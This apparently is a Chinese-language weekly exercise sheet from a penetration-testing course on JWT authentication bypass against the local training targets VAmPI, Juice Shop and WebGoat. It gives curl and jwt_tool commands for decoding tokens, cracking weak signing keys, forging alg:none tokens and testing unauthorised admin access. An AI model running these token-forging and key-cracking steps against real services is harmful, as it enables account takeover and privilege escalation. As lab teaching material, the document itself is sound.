# Week 6 — 认证绕过与 JWT 权限提升

> **靶场**: VAmPI + Juice Shop + WebGoat | **工具**: jwt_tool, jq, curl, Burp
> **技能**: `jwt-privilege-escalation`, `jwt-oauth-token-attacks`, `authbypass-authentication-flaws`
> **难度**: ⭐⭐⭐ | **预计时间**: 6 小时

## 本周目标

掌握现代 Web 应用最核心的安全问题：**JWT 令牌攻击与权限提升**。理解 JWT 的工作机制，学会从发现 Token 到实现越权的完整流程。

## 练习任务

### 任务 1: JWT 基础 — VAmPI (2h)

VAmPI (`localhost:5000`) 是专门练习 JWT/API 漏洞的靶场。

```bash
# 1. 注册并登录
curl -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"test123"}'

TOKEN=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"test123"}' | jq -r '.auth_token')

# 2. 解码 JWT（三段式：header.payload.signature）
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .   # Header
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .   # Payload

# 3. 检查 Payload 中是否有 role/admin/permissions 字段
# 4. 尝试用普通用户 Token 访问其他用户数据（BOLA/IDOR）
curl http://localhost:5000/users/v1/admin -H "Authorization: Bearer $TOKEN"
```

### 任务 2: JWT 密钥破解 — Juice Shop (2h)

Juice Shop (`localhost:3000`) 的 JWT 使用了弱密钥。

```bash
# 1. 从浏览器 DevTools → Application → Local Storage 获取 token
# 2. 用 jwt_tool 尝试破解
pip install jwt_tool
jwt_tool <JWT> -C -d config/elite-passwords.txt

# 3. 破解成功后，修改 Payload 中的 email/role 字段
# 4. 重新签名并替换浏览器中的 Token
```

### 任务 3: 认证绕过专项 — WebGoat (1.5h)

WebGoat (`localhost:8081/WebGoat`) → **(A2) Broken Authentication** 课程：

- JWT tokens — 破解弱签名的 JWT
- Password reset — 密码重置逻辑漏洞
- 尝试修改 JWT 的 `alg` 字段为 `none`

### 任务 4: 分析项目技能文件 (30min)

```bash
# 阅读 JWT 相关技能
cat skills/pentest_skills/jwt-privilege-escalation/SKILL.md
cat skills/pentest_skills/jwt-oauth-token-attacks/SKILL.md

# 理解 JWT 攻击的分类:
# - alg:none 攻击
# - HS256 弱密钥破解
# - RS256→HS256 公钥混淆
# - kid 头注入
# - jku/jwk 头注入
```

## JWT Cheat Sheet

```bash
# 快速解码 (不验证签名)
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# jwt_tool 扫描
jwt_tool <JWT> -t http://target -rh "Authorization: Bearer <JWT>" -cv "Welcome"

# 生成 none 算法 Token
jwt_tool <JWT> -X a

# 暴力破解密钥
jwt_tool <JWT> -C -d /path/to/wordlist.txt
```

## 交付物

```markdown
## VAmPI JWT 分析
- Payload 中包含的关键字段: _____
- 发现的越权接口: _____
- 是否成功访问其他用户数据: [是/否]

## Juice Shop JWT 破解
- 密钥: _____
- 破解耗时: _____
- 修改后的权限: _____

## 总结
- JWT 不安全使用的 3 个关键信号:
  1. _____
  2. _____
  3. _____
```
